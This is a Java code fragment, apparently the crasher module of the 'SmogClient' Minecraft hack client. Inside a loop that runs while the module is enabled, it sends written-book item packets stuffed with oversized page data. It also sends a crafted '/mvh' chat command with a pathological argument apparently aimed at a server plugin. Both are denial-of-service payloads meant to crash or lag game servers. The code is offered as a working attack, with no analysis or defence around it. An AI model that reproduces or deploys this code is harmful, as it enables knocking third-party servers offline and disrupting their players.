while (enabled) {
    switch (mode) {
        case "NETTY1":
            // THE SAME AS NETTY2 & 3
            // LOST THE DEBUG LOG LMFAO BUT ITS THE SAME
            break;
        case "NETTY2":
            for (int i = 0; i < 100; i++)
				list.appendTag(new NBTTagString("....."));

            comp.setString("author", "SmogClient");
            comp.setString("title", "BOOK");
            comp.setByte("resolved", (byte) 1);
            comp.setTag("pages", list);

            stack.setTagCompound(comp);

            mc.getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 2, 0, 0, stack, (short) 1));
            break;
        case "NETTY3":
            for (int i = 0; i < 150; i++)
				list.appendTag(new NBTTagString("................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................."));

            comp.setString("author", mc.thePlayer.getName());
            comp.setString("title", "SmogClient");
            comp.setByte("resolved", (byte) 1);
            comp.setTag("pages", list);

            stack.setTagCompound(comp);

            mc.getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(-1, stack));
            break;
		case "MVCBYPASS":
            mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/mvh ('.'\"\"+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.+.++)%"));
            break;
    }
}